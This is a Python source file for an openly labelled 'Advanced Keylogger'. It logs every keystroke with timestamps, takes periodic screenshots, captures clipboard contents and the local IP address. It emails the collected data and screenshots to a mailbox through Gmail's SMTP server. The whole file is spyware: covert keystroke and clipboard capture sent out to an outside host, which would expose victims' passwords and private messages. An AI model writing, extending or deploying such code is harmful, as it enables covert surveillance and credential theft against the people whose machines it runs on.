import keyboard
import datetime
import pyautogui
import pyperclip
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import os
import socket

# Email settings
EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_email_password"
REPORT_INTERVAL = 60  # 1 minute

# Screenshot settings
SCREENSHOT_INTERVAL = 30  # 30 seconds
SCREENSHOT_DIR = "screenshots"

# Network traffic monitoring settings
NETWORK_INTERFACE = "eth0"  # Replace with your network interface

# Initialize variables
key_logs = ""
screenshot_count = 0
clipboard_data = ""

def capture_key_stroke(event):
    global key_logs
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_logs += f"[{timestamp}] {event.name}\n"

def capture_screenshot():
    global screenshot_count
    screenshot = pyautogui.screenshot()
    screenshot.save(f"{SCREENSHOT_DIR}/screenshot_{screenshot_count}.png")
    screenshot_count += 1

def monitor_clipboard():
    global clipboard_data
    clipboard_data = pyperclip.paste()

def monitor_network_traffic():
    # Use a library like scapy to capture network traffic
    # For simplicity, we'll just get the current IP address
    ip_address = socket.gethostbyname(socket.gethostname())
    return ip_address

def send_email_report():
    msg = MIMEMultipart()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS
    msg["Subject"] = "Keylogger Report"

    body = f"Key Logs:\n{key_logs}\n\nClipboard Data:\n{clipboard_data}\n\nNetwork Traffic:\n{monitor_network_traffic()}"
    msg.attach(MIMEText(body, "plain"))

    # Attach screenshots
    for file in os.listdir(SCREENSHOT_DIR):
        with open(f"{SCREENSHOT_DIR}/{file}", "rb") as f:
            img = MIMEImage(f.read(), name=file)
            msg.attach(img)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
    server.quit()

def main():
    print("Advanced Keylogger is running. Press Ctrl+C to stop.")
    keyboard.on_release(capture_key_stroke)

    while True:
        capture_screenshot()
        monitor_clipboard()
        if datetime.datetime.now().minute % REPORT_INTERVAL == 0:
            send_email_report()
        keyboard.wait('ctrl+c')

if __name__ == "__main__":
    main()